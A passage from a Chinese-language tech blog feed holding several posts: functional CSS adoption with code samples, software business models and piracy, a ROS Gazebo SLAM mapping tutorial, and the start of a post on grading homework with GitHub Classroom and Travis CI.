當然上面都有一些方法可以解決啦，例如說可以把 js 檔案分開，你到那一個頁面就只要下載那一個頁面的 js 即可。SEO 的解決方法則是將兩種結合，第一次先在 server side render，之後的操作都改用 client side render，就可以保證搜尋引擎也能爬到完整的 HTML。
但你知道的，可以解決是一回事，要花多少心力去解決又是另外一回事了。
總結這篇大概講到了一開始最常見的網站架構，然後到近期導致前端開發複雜化的 SPA。我以前剛接觸的時候也是一頭霧水，想說到底前端為什麼需要 MVC。可是經過這一連串的脈絡思考下來，就很能理解原因了。
當你東西變得愈來愈複雜，就需要一個架構去把職責切割開來，不然會造成日後維護上的困難。
當你越瞭解 SPA 所帶來的優缺點，你在選擇要不要用的時候就有更多面向可以參考，就有更多的理由去支持你所做的決定，而不單單僅是「哇！好潮喔！別人用了我也要用！」
希望這篇對大家有幫助，最後附上一篇延伸閱讀：Why I hate your Single Page App
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>frontend</tag>
        <tag>backend</tag>
        <tag>mvc</tag>
        <tag>SPA</tag>
      </tags>
  </entry>
  <entry>
    <title>邪魔歪道還是苦口良藥？Functional CSS 經驗分享</title>
    <url>/2019/01/26/functional-css/</url>
    <content><![CDATA[前言以 CSS 架構方法來說，主流的大概可以分成三個：OOCSS、SMACSS、BEM，這些架構的提出都是為了讓 CSS 更好維護，這幾個的介紹以及差異可以參考 @arvinh 寫過的 淺談 CSS 方法論與 Atomic CSS。
但我們今天要談的不是上面提到的這三種，而是另外一種相較之下沒那麼主流（但好像有慢慢流行的趨勢），而且很少人第一眼看到就會贊同的方法：functional CSS。
什麼是 functional CSS直接舉一個例子最快：
// 一般的寫法&lt;div class=&quot;hello&quot;&gt;Hello&lt;/div&gt;  .hello &#123;  font-weight: 700;  color: red;  padding: 1rem;&#125;  // Functional CSS&lt;div class=&quot;fw7 red pa3&quot;&gt;Hello&lt;/div&gt;  .fw7 &#123;  font-weight: 700;&#125;.red &#123;  color: red;&#125;.pa3 &#123;  padding: 1rem;&#125;

就好像 functional programming 那樣，每個函式都沒有副作用而且可以互相組合，在 functional CSS 裡面每一個 class name 都只負責一個部分（不一定是一個屬性），就像我上面舉的那個範例，它會產生一個字是粗體、紅色並且有 padding 的 div。
順帶一提，如果你有用過 Bootstrap4 的話，你很有可能已經體驗過 functional CSS 了，裡面就出現了一大堆這種類型的 class name 。
你喜歡這種風格的寫法嗎？
如果你是第一次看到這種寫法，我覺得你心裡想的應該是：「這是三小，好噁心」、「這不就是 inline style 嗎」、「這根本不是 CSS 吧！」
沒關係，我第一眼看到也是這樣覺得的，但會寫這篇文章就是因為我後來改觀了，於是接下來我要談談我與 functional CSS 從互相厭惡到和解的過程。
我與 functional CSS 的愛恨糾葛一開始看到 functional CSS 覺得很特別但也很奇怪，老實說連想試的感覺都沒有，只覺得這樣寫 CSS 也太奇怪了吧，根本就是邪魔歪道！而且 class name 一點可讀性都沒有。
但有天我在 hacker news 上面讀到了這篇文章：In defense of Functional CSS，徹底改變了我對它的想法。
這篇文章針對幾個常見的批評給予了反駁，我下面舉幾個文章裡面提的例子：
跟 inline style 差在哪？
Inline style 不能有 media query
inline style 的屬性可以隨意設置（這之後我會講詳細一點）
Inline style 沒辦法處理 :before, :after
Inline style 無法重用，但是 css class 可以，我可以定義一個叫做 .bg-red 的規則，想要背景是紅色的加上去就行了
Inline style 跟 functional css 的可讀性還是有差，比比看 class=&quot;f-sm bg-blue&quot; 跟 style=&quot;font-size: 10px; background-color: #0000ff;&quot;

我覺得作者的幾個反駁都滿合理的，inline style 跟 functional CSS 的確是有差，我想讀到這裡大家應該可以認同如果這兩個一定要選一個，選後者是合理許多的，因為可重用而且可讀性較高。
但大多數人反對 functional CSS 的主要理由還有一個，那就是會把 html 弄的很髒而且不知道在幹嘛。
例如說原文中提到的範例：
&lt;div class=&quot;profile-card&quot;&gt;  ...&lt;/div&gt;&lt;style&gt;  .profile-card &#123;    padding: 20px;    margin: 20px;    color: #eee;    background: #333;    border: 1px solid #555;  &#125;&lt;/style&gt;&lt;div class=&quot;m-5 p-5 text-gray-light bg-gray-darker border border-gray-light&quot;&gt;  ...&lt;/div&gt;

前者你一看就知道是一個 profile card，但後者你光看 html 根本看不出來他是什麼。
在這邊作者給的解釋我覺得也很不錯：

你可以一起用啊

對欸，你可以變成這樣：
&lt;div class=&quot;profile-card m-5 p-5 text-gray-light bg-gray-darker border border-gray-light&quot;&gt;  ...&lt;/div&gt;

這樣你可以維持原有的 class name 命名方式，而這個命名只是為了方便讓你辨識出這個元素是什麼，實際上在做 styling 的還是後面的那些 functional class name。
如果還想再反駁，大概就是 html 看起來還是很髒而且一大堆 class name。我覺得這是優點也是缺點，端看你怎麼去看它。
若是你完全不知道那些 class name 是什麼意思，你當然會覺得那是一堆垃圾；但如果你知道是什麼意思，你會發現光是看 HTML，你就可以知道樣式長怎樣，你不必在 HTML 與 CSS 之間切換，而是只要專注在 HTML 就好，因為它的樣式都寫在 class name 裡面了。
舉例來說，你原本的開發流程可能是這樣：

建立一個 profile-card 的html
加上 .profile-card class name
開一個 profile-card.css 開始寫樣式
新增 profile-card-avatar 的 html
加上 .profile-card-avatar 的 html
開始幫這個 class name 寫樣式

但採用 functional CSS 之後，開發流程變這樣：

建立一個 profile-card 的html
幫 profile-card 加上 class name
新增 profile-card-avatar 的html
幫 profile-card-avatar 加上 class name

不用再在 HTML 與 CSS 間切換，因為沒有 CSS 檔案讓你切換。
可是重用性太低了吧，我要幫每個 button 都寫 20 個 class？這個批評基本上是說，假設我有一個 button 用 functional css 之後長這樣：&lt;div class=&quot;bg-blue fw5 pa1&quot;&gt;Click me&lt;/div&gt;
那如果我有其他地方要用這個 button，我不就要複製這一串？如果我 button 的樣式換了，那我不就所有地方都要改？這個重用性也太差了吧。
原文中給的反駁是如果真的有這種情況發生，你應該優先考慮的是把這段 HTML 抽成可重用的 template 之類的，而不是把這個問題怪到 class 身上。
或者我這樣說好了，應該把這個東西變成一個 component，這樣問題就迎刃而解了，因為你只要改 component 就好，不用每個地方都改。
以上就是這篇文章大概的內容，有興趣的可以去看原文，原文寫的比我摘要得清楚滿多的而且講了更多。但總之我看完這篇文章之後有了些想法，並且開始認識到 functional CSS 的好處到底在哪。
Functional CSS 到底好在哪？第一個好處就是你從此（幾乎）不必再寫 CSS！而且你也不用再猶豫 class name 到底要取什麼了！
這簡直拯救了一堆有命名恐懼症的開發者。用了 functional CSS 以後只要幫 html 加上相對應的 class 就好，就如同我上面舉的範例那樣。
這時候你可能會說：「那我要怎麼知道這段 HTML 到底是幹嘛的？」
第一種解法上面有提過，就是把原本的 class 也加回去，所以有意義的 class name 當作辨識用途，functional css 當作樣式來使用，但這個方法我個人覺得有點多此一舉就是了，而且還要再花時間想要命名什麼 class。
第二種解法是 component，我後來意識到有些 functional CSS 會碰到的問題可以靠 component 來解，這個 component 可以是 web-component 也可以是 React 或是 Vue 裡面的那種 component。
當我們有了 component 以後，就沒有那麼需要 class name 了，因為你看 component 的名稱就知道它是個按鈕，從元件的命名就可以知道，不必再從 class name。況且就算原本有 class name，你還是要先去對照畫面才能確定你到底要改哪裡，畢竟有些 class name 命名的超級模糊，這我相信大家一定都有體會過。
原本在寫 CSS 時你需要考慮的很多東西，到了 functional CSS 幾乎都不存在，你要做的只有幫 HTML 加上 functional CSS 的 class name 幫它裝飾而已。
第二個好處是你一但採用 functional CSS，就可以立刻幫你的 project 產生出一套規範，有點像是 design guideline 那樣。
這是什麼意思呢？
首先，大家可能會對 functional CSS 有個錯誤認知，那就是覺得它說穿了還是另外一種形式的 inline style，只是多此一舉寫成 class 而已。
不是的，它並不是你想用什麼就用什麼，而是先把規範訂好，你再從可以用的 class 裡面去挑你要用的出來。例如你們產品的網站的背景有兩種主色分別是紅色與藍色，於是你寫了 .bg-red 跟 .bg-blue 這兩個 class。
今天有一個新人來你們公司，他想用紅色就會直接用 bg-red 而不是自己再寫一個 class。如果他真的再寫一個，那 code review 時也可以輕易抓到，因為用了 functional css 的專案通常 CSS 檔案寫好後就不會再變動了，所以有更動的時候特別明顯。
如果今天是按照以前寫 CSS 的方式，有可能他在 CSS 裡面就偷懶直接寫色碼而不是用你在 color.scss 定義好的變數，或也有可能他在 color.scss 裡面眼殘沒看到 bg-red，所以自己加個 bg_red 的 class。 
是的，這一樣在 code review 的時候可以抓到，但我想表達的是前者耗費的心力會比後者少，因為要檢查的地方比較少。
一但 functional CSS 的主要 style.css 完成後，這份檔案同時也代表網站的規範，可以使用的顏色、padding、margin、字體、字體大小都在裡面了，想用的時候只能從這裡面找，不能自己隨意新增，所以你可以很輕鬆就規定網站的 padding 只能是 4、8 或是 16，或是行距只能有 1、1.25 跟 1.5。
其實以前用 SCSS 或任何 CSS 預處理器時也可以這樣做，把所有規範都訂成變數，並且規定所有規則都只能用這些變數。但我認為 functional CSS 天生就蘊含著規範在裡面。
第三個好處是檔案大小驟減，因為 padding: 4px 只會在 CSS 檔案裡面出現唯一一次，color: red 也只會出現唯一一次，以 functional CSS 的 framework Tachyons 來說，minified 跟 gzipped 過後的 CSS 大小是 14kb。
現在是 14kb，以後也會是 14kb，因為你所有需要的規則都在裡面了，你的 CSS 大小不會再隨著網站的複雜度增加，這也是很棒的一點。
另外一個 functional CSS framework Tailwind 的作者寫了一篇很棒的文章來探討一些優缺點，並且有脈絡地帶你看 functional CSS 的優勢在哪，我自認絕對不可能寫的比那篇好，所以有興趣再深入理解的可以參考：CSS Utility Classes and “Separation of Concerns”。
總之呢，在爬了一大堆文章以及跟同事討論過以後，我們決定把公司的產品換成 functional CSS，會想換的原因有兩個：

CSS 越來越多以後很難維護，只要不小心一個偷懶就成了未來的技術債
CSS 檔案越來越大，但其實可以小很多

Function CSS 實戰經驗分享之前看過一篇 Full re-write in 10 days with tachyons and functional CSS: A case study，作者講述他如何輕鬆寫意的在十天裡面把整個網站改寫完成。
而我們那時除了要重構這些 CSS 以外還要修 bug 跟開發新的功能，所以前前後後大概一個月才把整個網站換完，而且實際下去重構才發現以前寫的有些 CSS 真的是超難維護，因此在這部分也多花了點時間。
上面有提到幾個相關的 CSS framework，但我認為 functional CSS 的概念簡單好懂，自己從頭實作一個反而比較符合自己的需求，於是就參考 Tachyons 的 class name 來實作。
第一步大概是先把一些常用的 class 定出來，例如說顏色：
.c-red &#123; color: $color-red; &#125;.c-yellow &#123; color: $color-yellow; &#125;.c-white &#123; color: white; &#125;.c-green &#123; color: $color-green; &#125;.c-grey-83 &#123; color: $color-grey-83; &#125;.c-grey-4a &#123; color: $color-grey-4a; &#125;.c-grey-bb &#123; color: $color-grey-bb; &#125;.c-grey-f8 &#123; color: $color-grey-f8; &#125;

還有必備的 flex 排版：
.flex &#123; display: flex; &#125;.inline-flex &#123; display: inline-flex; &#125;.flex-auto &#123; flex: 1 1 auto; &#125;.flex-column  &#123; flex-direction: column; &#125;.flex-row     &#123; flex-direction: row; &#125;.flex-wrap    &#123; flex-wrap: wrap; &#125;.flex-nowrap    &#123; flex-wrap: nowrap; &#125;.items-start    &#123; align-items: flex-start; &#125;.items-end      &#123; align-items: flex-end; &#125;.items-center   &#123; align-items: center; &#125;.items-baseline &#123; align-items: baseline; &#125;.items-stretch  &#123; align-items: stretch; &#125;.justify-start   &#123; justify-content: flex-start; &#125;.justify-end     &#123; justify-content: flex-end; &#125;.justify-center  &#123; justify-content: center; &#125;.justify-between &#123; justify-content: space-between; &#125;.justify-around  &#123; justify-content: space-around; &#125;

除此之外，也可以自己寫一些 utility class：
.ellipsis &#123;  overflow: hidden;  text-overflow: ellipsis;&#125;  .limit-line &#123;  overflow: hidden;  text-overflow: ellipsis;  display: block;  display: -webkit-box;  -webkit-line-clamp: 1;  -webkit-box-orient: vertical;&#125;  .pointer:hover &#123; cursor: pointer; &#125;

這就呼應我前面提到的，一個 class name 其實可以有一個以上的規則，只要你能從 class 的名稱清楚知道它在做什麼就好。
重構時的流程其實很固定，基本上就是這幾步：

選定要重構的 component
先從最裡層開始，右鍵檢查，確定這個 class name 沒有其他副作用
把原本的 style 換成 functional CSS
把原本的 class name 移除

在此過程中可以順便把網站的樣式做個規範，例如說原本 padding 是 5 的地方統一變成 4 等等，網站就會變得越來越規範。
不過重構時當然也碰到一些困難，那就是有些以前寫的 CSS 為了圖方便沒有考慮到維護性的問題，到頭來這個坑還是落到自己身上。舉例來說，有個元件叫做 Card，需求是在首頁以及在餐廳頁面它的 padding 不一樣，所以以前就這樣寫：
// home_page.scss.home-page &#123;  .card &#123;     padding: 10px    &#125;&#125;  // restaurant_page.scss.restaurant-page &#123;  .card &#123;    padding: 15px;  &#125;&#125;  // card.scss.card &#123;  padding: 20px;&#125;

問題是什麼？問題是如果你只看 .card 的 CSS，你根本不會發現它在不同的頁面下會有不同的 padding！如果只是 padding 的話問題還小，但如果依照這個邏輯繼續往下寫，有可能連顏色跟 margin 都變了，像是：
.home-page &#123;  .card &#123;     padding: 10px    &amp;__title &#123;      margin-top: 20px;      background: red;     &#125;   &#125;&#125;

這種做法是把顯示的邏輯放在 CSS 裡面，利用 CSS 去操控，所以 JS 裡面不用額外寫任何東西，Card 這個 component 在不同地方就會有不同的樣式。
但我後來覺得這樣不是種好作法，應該要把邏輯移回 JS 裡面比較好，所以改成這樣寫：
// home page&lt;Card type=&quot;home&quot; /&gt;  // restaurant page&lt;Card type=&quot;restaurant&quot; /&gt;  // Card componentfunction Card(&#123; type &#125;) =&gt; (  &lt;div className=&#123;cx(&#123;    &#x27;padding-20&#x27;: !type,    &#x27;padding-10&#x27;: type === &#x27;home&#x27;,    &#x27;padding-15&#x27;: type === &#x27;restaurant&#x27;  &#125;)&#125; /&gt;)

在不同地方我用 component 的 props 來區分，並且把這段邏輯放在 component 裡面，比起 CSS 的做法當然有好有壞，但至少可以保證當我 render 單純的 &lt;Card /&gt; 的時候，在任何一個頁面它的樣式都會是一致的，不用擔心在不同地方會突然出現不同的樣式。
在重構的過程中其實發現很多這種問題，如果沒有趁早除掉的話 CSS 只會越來越多而且越來越亂，到最後會變得超級難維護，會很容易發生改一個 class 壞兩個地方，牽一髮動全身的現象。因此剛好趁著改寫成 functional CSS 的時候來處理這些問題。
許多人對 functional CSS 還有一個誤解，那就是不能寫「其他的」 CSS。舉例來說，我前面提到 functinoal CSS 自成一個規範，沒有寫成 class 的東西你不能用，但其實有些特殊情況還是可以的。
例如說你今天有一個 div 的高是 333px，難道你就要寫一個 .height-333 的 class 嗎？如果真是這樣的話那真的跟 inline style 沒兩樣了。
但 functional CSS 考量的點應該是「能否重用」，能夠重複使用的才把它寫成 class name，像是高 333px 這種我就會直接用 styled-component 或甚至直接寫 inline style，不會特地給它一個 .height-333 的 class，因為整個 App 可能就只有它用得到。
最後讓我們來看一下改寫的成果，這是改寫前，CSS 大約 400kb（gzipped 前）：

這是改寫後，可以看到各項數據都下降很多，CSS 大約 130kb，其實還可以再小，會比較大是因為裡面有一些轉成 base64 的小圖：

改寫之後減少了將近 70% 的 CSS 體積。
而且重點是無論以後 App 大了十倍還是一百倍，CSS 都能夠維持在差不多的大小，因為常用的屬性都被我們變成 class name 了。
改寫的難易度取決於你原本 CSS 的質量，像我們很多 CSS 為了求快沒有多思考耦合就很高，常常要參考兩三個 CSS 檔案才能拼湊出最後 style 的長相。但如果原本就有處理好這個問題，速度應該能夠快滿多的。但整體來說改寫還是算是容易，而且每次改寫完成就感很大，可以直接把一大堆 CSS 規則刪掉，滿有快感的。
有興趣的朋友可以用這個網站對自己的產品做測試：https://cssstats.com/。
總結如果要說 functional CSS 有什麼缺點的話，我目前想到的就是剛開始學習需要一段時間以及 style 多的話 HTML 會變得充滿一堆 class name，比較難閱讀而且檔案也較大，但相較之下我依然認為優點是多過缺點的。
優點前面也大概都說過，基本上就是不用擔心 CSS 的耦合性問題，絕對不會發生改一個 class name 壞兩個 component 的情況，因為每個 class name 都不會互相干擾，也可以保證你把這個 component 搬到任何地方都還是長得一樣，背後不會有特別的 CSS 在那邊搞你。
也不用再煩惱 class name 要怎麼命名了因為你不需要，這個就可以節省滿多時間的。也不用再手寫 CSS 了，所以開發速度也變快了，因為不用再在 CSS 檔案與 component 之間切換，你邊寫 HTML 的時候就可以順手把 style 寫完，存檔以後看個畫面再調整一下就行了，跟以前相比步驟少了很多。
其實對 CSS 我的經驗不是那麼多，可能有很多 case 沒有考慮到或是優缺點沒有講得很清楚，如果對 functional CSS 想要更深入研究的，我文末附的資料都很有參考價值，大家可以看看。
但總之，我現在是 functional CSS 的支持者之一了。
參考資料：

In defense of Functional CSS
Tachyons
Full re-write in 10 days with tachyons and functional CSS: A case study 
Tailwind: style your site without writing any CSS!
CSS Utility Classes and “Separation of Concerns”
HN 上面的討論

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>functional CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>軟體開發的未來，是大斗內時代？</title>
    <url>/2018/11/14/future-of-software/</url>
    <content><![CDATA[
本文從付費軟體的困境，講到廣告商業模式以及付費帳號模式，再講到近年來日趨流行的「獎賞制度」，來談談內容創作的困境，以及當面對網際網路快速發展的因應之道。

軟體如何賺錢在我剛開始寫程式的時候，我就曾經想過，如果我做出了一個很好的遊戲，我該如何賺錢？，簡單就是賣嘛，付了錢我就給你程式。但這最大的問題是你如何確定買家不會將你的產品給其他人？。
我開始思考各種的商業模式，發現要賣軟體竟是一件相當困難的事，阻止盜版非常困難，其實這本質的原因在於軟體是一種邊際成本為 0 的產品。
付費軟體的困境盜版猖獗，永遠是付費軟體最大的困境。軟體之所以有這樣的問題，正是由於它的「邊際成本為 0 」。邊際成本是經濟學的名詞，意思是當你增加一份產品時所需要增加的成本。生產一台汽車的成本很大，但生產 10000 量汽車可能平均下來就沒那麼大。而軟體則是一個邊際成本為 0 的產品，你要多賣給一個使用者，頂多光碟多燒一片，不然哪有什麼成本？
你以為這樣很好嗎？是的，或許你可以節省成本，但 對於盜版者而言更好 。你開發軟體需要成本，但盜版的人連開發的成本的省下來了，那對盜版者而言，可真的是「無本生意」。不只是軟體，各式各樣的創作，只要是邊際成本為 0 的，例如文章、圖畫、影片，可以被輕易用電腦複製的，都可說是邊際成本為 0 的產品，因此很容易遭受盜版威脅。
因此，邊際成本為 0 的產品，用免費的商業模式最有效率，我並不是說不該支持使用者付費，只是在效率上，免費的商業模式效率較佳。
也因為這個原因，導致廣告的商業模式興起。
免費時代來臨？在網際網路普及之後，盜版軟體變得越來越猖獗，基本上所有知名的商業作品一定都有它的盜版，漸漸的，購買正版已經成為一種額外的支持行為，講難聽點，是一種「施捨」，而不是正常消費途徑了。
軟體開發商開始注意到這個問題，於是他們開始用一種截然不同的商業模式—免費。從 YouTube、Google 搜尋引擎 ，到 LINE、Facebook ，打開 Play 商店，大部分的 app 也都是免費的，它們依靠著廣告商賺錢。
你有想過為什麼 Facebook 免費嗎？因為你對它有價值，你的加入會讓你的更多朋友喜歡使用，也就會讓廣告被更多人看見，它就能賺更多錢。
當你使用一個免費軟體，多半代表你對軟體公司有價值，你就是他們的產品之一，因此你得以免費。所以才會有人說「免費的最貴」這類的話。
付費帳號 —兼具免費與付費的解法如果我真的不想要廣告呢？現在還有「付費帳號」這種解法，例如 Medium, Pocket, GitHub 等公司，在除了提供免費服務外，另外提供了「付費版帳號」，讓想要更多功能的使用者可以購買付費版，這樣既能保持不受廣告控制，又能有經濟收入。
但付費版帳號就不會被盜版嗎？，事實上，比較難。現代的各種付費商業模式多半是採「帳號制」，也就是你購買的是一個帳號。只要是帳號，就比較好控制，因為資料在公司內部的伺服器，如果服務是在網頁上的話更是如此，使用者無法取得完整的程式（只能夠取得單一網頁的 HTML、JavaScript …），也就比較難被逆向或是破解，因為所有的程式碼都在公司自己的伺服器中。
想想看，你一定有聽過盜版的威力導演、盜版的 Windows，但你有聽過 盜版的 YouTube 嗎？盜版的 Medium？盜版的 GitHub？我相信你沒有，因為將帳號資料放在伺服器，基本上就能夠避免無限量複製，因為服務是「認帳號」，你沒有帳號，空有程式也沒用。事實上，現在許多 YouTuber 使用的付費訂閱 PressPlay 就是採用帳號制，內容都在 PressPlay 的伺服器，它可以依據你帳號的狀態來決定是否要給你內容，因此你很難盜版。而有名的付費遊戲— Minecraft 也是採帳號制，這樣可以方便使用者在不同設備遷移，而且管控簡單。
大斗內時代，可能嗎？但即使是上述所說的付費帳號制度，仍然是有可能被盜版的，因此在過去許多軟體開發商設計很多數位鎖，想要防止被盜版，但 歷史證明，都沒有用。開發數位鎖浪費了軟體開發商的大筆時間和金錢，但最後鎖住的，卻往往是有良心乖乖買正版的使用者。
因此有人開始提出了新的解決方案，獎賞制度，你可以免費的使用，但如果你喜歡，請你給我一點報酬。這樣的方式開始逐漸的流行，之所以崛起，很大程度是因為「網路的更發達，讓線上支付的門檻降低了」。
當你在街上看到一位優秀的街頭藝人，你聽完了他的表演，覺得很不錯、很精彩，於是就給了他十塊錢，這很容易，因為十塊錢對你來說是小錢，而「將錢投入帽子中」這個動作又十分的簡單。
但如果你今天在網路上看到一個創作者的影片，他的內容一樣很精彩，你一樣想給他回饋，但如果你沒辦法用非常簡單的方式給他十塊錢，你很可能會打消念頭。當你想到你可能需要設定信用卡，或是到便利超商付款，甚至是對安全的隱憂，你可能就因為怕麻煩而算了，心理默默為他感到可惜，「假如可以更簡單一點，我就願意給你報酬了」。
但在近年來，線上支付開始變得便利而安全，這個門檻有越來越低的趨勢；而加密貨幣的興起，也讓未來網路的支付有新的可能。因此開始有 Matters 這種，創作公開，但能使創作者有回報的平台出現。  
案例研究：Elementary OS、好和弦Elementary OS （以下簡稱 Elementary）是一個開源的 Linux 發行版，它是完全開源的，但希望你能夠付費下載，事實上，它讓你自己決定要花多少錢購買它，包括 0 元。
在它的軟體商店 AppCenter，有一些由他們所製作的軟體，會根據他們的看法標一個建議價格，但你仍然可以自己決定要花多少 —Nicechord 好和弦，他做的是音樂創作、樂理教學，內容質量非常高，但他並沒有開啟 YouTube 營利功能，也就是他的影片並沒有收廣告費用，他是靠賣「家庭號大包裝」來營利，而家庭號大包裝的內容通通都在 YouTube 上。而價格也很自由，是「一塊美金以上的任意價格」，這樣既免了盜版的問題（因為所有內容都可以在 YouTube 免費取得），而且可以得到收入，又能有著相當好的形象，我認為是相當有智慧的商業模式。
但獎賞制度的最大困境在於收入的不穩定，且需要來自良好的形象。正如同街頭藝人沒辦法有相當穩定的收入，依賴捐款或是「獎賞」的收入也很難預測，或許當經濟變得蕭條時，人們就會減少這類的支出，導致收入變少，這也是現在比較難克服的問題。
創作者的未來在經歷了網路快速發展後，讓付費的軟體開始無法繼續生存，逐漸被免費軟體取代。但在逐漸重視隱私權的今天，廣告收益模式又越來越受到詬病，而其帶來的流量取向、內容敗壞等問題，也讓創作者越來越難以生存。
但近來有了新的轉機，科技的進步讓線上支付變得更加輕易，或許在不久的將來，線上支付、加密貨幣的發展使得「讚賞」變得像把硬幣丟進帽子一般簡單，那時利用網路的傳播能力，其收入絕對不是街頭藝人可以比擬的。
套一句囧星人在 &lt;盜版的未來&gt; 影片中所說的話：

這將會是個創作者的大好時代

對此，我感到十分期待。
延伸閱讀這次的文章，我很大的啟發是來自於囧星人 &lt;盜版的未來&gt; 這支影片；而 INSIDE 文章 &lt;從付費到免費再到補貼 —— 商業模式變遷的底層邏輯&gt; 讓我對於商業模式變遷的實際原因有了更深入的了解，兩者都有非常精闢的內容，強力推薦。盜版的未來｜資訊分享，鎖得住？—冏星人從付費到免費再到補貼 —— 商業模式變遷的底層邏輯   
關於作者林宏信 lancatlin，國中生、業餘軟體工程師，經營部落格 WANcatServer 網貓伺服器   
]]></content>
      <tags>
        <tag>商業模式</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Gazebo 模擬器控制機器人建立 2D 地圖</title>
    <url>/2016/08/06/gazebo-robot-2d-map/</url>
    <content><![CDATA[前言ROS 很吸引人的一個地方在於，他跟模擬器 Gazebo 很好地結合在一起，讓使用者可以使用一台筆記型電腦就開始撰寫機器人程式，而且可以在筆電上看到程式執行的結果。模擬器裡的機器人不會撞壞、不會沒電，所以就算在程式設計過程中有錯誤，也不會有任何硬體成本的損失 (時間當然是會損失)，而且很容易大量測試演算法，因為可以在模擬器中設置各種場景，而不需要一個很大的空間和昂貴的機器人。這篇文章會簡單介紹怎麼在 Gazebo 裡面啟動 PR2，並遙控他來建立一個 2D 的地圖。
啟動 Gazebo 跟 PR2我的測試環境是 Ubuntu 14.04 + ROS Indigo，不過使用的指令都很 general，即便你使用其他版本，應該也不會有什麼問題。
首先我們確定已經安裝所需要的套件：
sudo apt-get install ros-indigo-gazebo-*

接下來在終端機輸入 gazebo 應該就可以成功啟動 Gazebo 模擬器。然後我們可以用現成的 package 啟動一個有 PR2 的空白模擬環境。
roslaunch pr2_gazebo pr2_empty_world.launch

Gazebo 裡面已經有很多現成的模型，選擇左邊的 Insert 頁籤，裡面就可以找到一些現成的模型，在這邊我先加入了 Cube 跟 Dumpster 的模型，加入後的結果如下圖：

對於機器人來說，最重要的第一個環節就是感知功能，他必須要可以感知環境中的資訊，才能做出相對應的動作。所以我們會先關心的就是 Gazebo 裡面的 PR2 機器人可不可以接收到環境中的資訊。
答案當然是可以的，我們可以透過 ROS 提供的 visualizer Rviz 來觀看 PR2 接收到的資訊，如果是已經熟悉 ROS 的讀者，想必對 Rviz 不陌生，只要開一個新的終端機，輸入 rviz 就可以啟動了。啟動之後，可以 Add 一個 Image 的顯示框，然後選擇現在可以看到的 topic，就可以看到 Gazebo 裡面的 PR2 看到的畫面。

啟動 gmapping package 建地圖環境都已經啟動了，接下來就要開始建地圖啦! 這邊我們使用的工具是 gmapping ，首先我們在隨便一個路徑新增一個 launch 檔 –  vim pr2_build_map.launch 。
然後輸入這一串文字，儲存檔案後離開。
&lt;launch&gt;  &lt;!-- dynamic map generation --&gt;  &lt;node name=&quot;gmapping_node&quot; pkg=&quot;gmapping&quot; type=&quot;slam_gmapping&quot; respawn=&quot;false&quot; &gt;    &lt;remap to=&quot;base_scan&quot; from=&quot;scan&quot;/&gt;    &lt;param name=&quot;odom_frame&quot; value=&quot;odom_combined&quot; /&gt;  &lt;/node&gt;&lt;/launch&gt;

然後可以用 roslaunch pr2_build_map.launch啟動。啟動 gmapping 之後，我們還是透過 Rviz 來觀看地圖建立的狀態，這邊需要加入 Map 的顯示，然後 topic 選擇 &#x2F;map 就好。地圖中的黑色線就是障礙物，淺灰色區域表示是可以走的無障礙物區域，深灰色則是未知區域。

讓我們近看一下 map 的 topic 要怎麼選：

但如果機器人不能移動的話，就只能顯示眼前看到的這一塊地圖。所以我們先使用簡單的遙控程式來控制 Gazebo 裡面的 PR2 移動。
這邊只要啟動 teleop_keyborad 就可以用鍵盤控制機器人移動：
roslaunch pr2_teleop teleop_keyboard.launch

WASD 四個按鍵分別代表前左後右四個方向的平移、QE兩個按鍵是原地旋轉，這邊要注意必須選到啟動 teleop_keyboard的視窗，按按鍵才有用。使用 teleop 來控制 PR2 走一走之後，就可以看得出我們已經使用 gmapping 建立了一個看起來有模有樣的地圖了。

如果你想要把地圖存起來，提供未來要做 Navigation 使用，或只是單純想留個紀念，可以用一個指令把地圖存起來 – rosrun map_server map_saver 。
總結這篇文章跟大家簡單介紹怎麼使用 Gazebo 模擬器來模擬機器人，並利用他實際操作了一個小小的 SLAM 功能，也建出了自己的一張地圖。我們能利用 Gazebo 來做的事情當然遠不止於此，不過時間有限，我們下次見。
延伸閱讀
gmapping 演算法原理簡介
SDF 網站中文版

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人</tag>
        <tag>Robot</tag>
        <tag>ROS</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 Github Classroom 加 Travis CI 打造改作業系統</title>
    <url>/2018/02/03/github-classroom-and-travis-ci/</url>
    <content><![CDATA[前言這陣子開始了一個自己的 side project，叫做程式導師實驗計畫，希望能在四個月內把學生培養成找得到工作的工程師。
而 Git 身為工程師的必備技能之一，用 Git 來交作業也是合情合理的一件事，可以先培養學生們對 Git 的熟悉程度。
但問題來了：要怎麼用 Git 交作業？
之前有開過另外一個前端的課程，那時候我採取的方式是讓學生自己開一個 Github repo 寫作業，並且設置 Github page，所以我可以看到學生的 source code 跟網頁顯示出來的結果。
接著自己設定好 Issue template，要學生寫完作業之後開 issue 提交，如下圖所示：

這樣的好處是我可以把作業都集中在同一個地方管理，可以很方便看出誰交了哪些作業，以及每個作業的狀況：

但缺點也很明顯，那就是身為老師，其實很難「改作業」，意思就是如果我要指正學生們哪邊寫錯了，我只能在 issue 裡面留言，複製它本來的程式碼，然後告訴他怎麼改應該會比較好：

整體來說，其實改作業的體驗還算不錯，沒什麼太大的問題。只是這次既然開始了一個全新的課程，就在想說有沒有更好的方法可以優化這個流程。
新的交作業流程我在設計課程的時候，都會先思考我在工作上運用了哪些東西，並且把我覺得好的、可以移植的制度搬到課程上，背後的目的是希望先讓學生理解這些東西，日後進入職場時可以無縫接軌。
但有時候我不會跟他們講這是你以後工作時可能會碰到的流程，期待他們真的碰到時驚呼：「哇，原來我在課程裡面做過的練習其實是工作上會用到的東西！」
舉例來說，因為這次新的課程是要求學生每天參與，在我沒有上課的時間自學，剛好公司有在跑 Scrum，每天早上都要開 Stand-up meeting，並且在開始前先在 slack 裡面送出簡短的 note，我就把這個制度引入到課程之中。
*昨天*- 完成 git 安裝- 解 codewar 題目：Opposite number*今天*- 解 codewar 題目：Opposite number- 寫作業：好多星星

